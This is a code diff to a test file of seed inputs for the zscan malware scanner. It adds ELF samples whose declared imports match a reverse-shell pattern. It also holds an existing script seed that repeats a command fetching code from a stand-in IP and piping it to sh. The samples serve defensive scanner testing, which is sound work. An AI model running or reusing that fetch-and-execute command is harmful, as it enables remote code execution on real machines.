@@ -9,13 +9,15 @@ from zscan.cli import main
 from zscan.scanner import Scanner
 from zscan.yara_engine import YaraEngine
 
-from samples import EICAR, benign_pe, make_zip, packed_like_pe
+from samples import EICAR, benign_pe, build_elf, make_zip, packed_like_pe
 
 SEEDS = {
     "pe": benign_pe(),
     "pe-packed": packed_like_pe(),
     "zip": make_zip({"a.txt": b"hello", "b.exe": benign_pe(), "c/eicar.com": EICAR}),
     "gzip": gzip.compress(make_zip({"eicar.com": EICAR})),
+    "elf64": build_elf(imports=("socket", "connect", "dup2", "execve")),
+    "elf32-be": build_elf(bits=32, big=True, imports=("socket",)),
     "script": b"#!/bin/sh\ncurl http://203.0.113.9/x | sh\n" * 20,
 }
 
